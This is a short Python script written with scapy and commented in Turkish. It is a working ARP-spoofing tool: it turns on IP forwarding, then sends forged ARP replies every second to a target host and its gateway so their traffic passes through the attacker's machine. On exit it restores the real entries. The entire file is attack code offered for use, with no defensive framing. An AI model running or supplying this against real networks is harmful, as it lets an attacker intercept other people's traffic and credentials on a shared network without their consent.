import os
import scapy.all as scp
import time
import optparse

os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def giris():
    parse = optparse.OptionParser()
    parse.add_option("-t","--target",dest="hedef_ip",help="Hedef ip giriniz")
    parse.add_option("-r","--hst",dest="modem_ip",help="Modem ip giriniz")

    ayarlar = parse.parse_args()[0]

    if not ayarlar.hedef_ip:
        print("Hedef IP Girmediniz...")
    if not ayarlar.modem_ip:
        print("Modem IP Girmediniz...")
    return ayarlar

def macbulucu(ip):
    istek_paket = scp.ARP(pdst=ip)
    #scp.ls(scp.ARP())
    yayin_paket = scp.Ether(dst="ff:ff:ff:ff:ff:ff")
    #scp.ls(scp.Ether())
    paket = yayin_paket / istek_paket
    asilpaket = scp.srp(paket,timeout=1,verbose=False)[0]
    return asilpaket[0][1].hwsrc

def arpcevap(ip1,ip2):
    macbul = macbulucu(ip1)
    arp_cevap = scp.ARP(op=2,pdst=ip1,hwdst=macbul,psrc=ip2)
    scp.ls(scp.ARP())
    scp.send(arp_cevap,verbose=False)

def reset(ip11,ip22):
    macbul = macbulucu(ip11)
    digermac =macbulucu(ip22)
    arp_cevap = scp.ARP(op=2,pdst=ip11,hwdst=macbul,psrc=ip22,hwsrc=digermac)
    scp.send(arp_cevap,verbose=False,count=5)


sayac = 0

girdi = giris()
hedef = girdi.hedef_ip
modem = girdi.modem_ip

try:
    while True:
        arpcevap(hedef,modem)
        arpcevap(modem,hedef)
        sayac += 2
        print("\nGönderilen paket sayısı " + str(sayac),end="")
        time.sleep(1)

except KeyboardInterrupt:
    print("\nÇıkış Yapılıyor")
    reset(hedef,modem)
    reset(modem,hedef)